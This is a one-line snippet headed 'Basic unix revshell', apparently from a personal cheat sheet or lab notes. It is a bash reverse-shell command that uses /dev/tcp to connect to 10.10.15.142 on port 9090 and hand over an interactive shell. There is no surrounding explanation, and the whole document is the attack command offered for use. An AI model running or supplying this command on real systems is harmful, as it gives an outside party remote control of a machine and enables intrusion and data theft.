```c
#Basic unix revshell
bash -c 'bash -i >& /dev/tcp/10.10.15.142/9090 0>&1'
```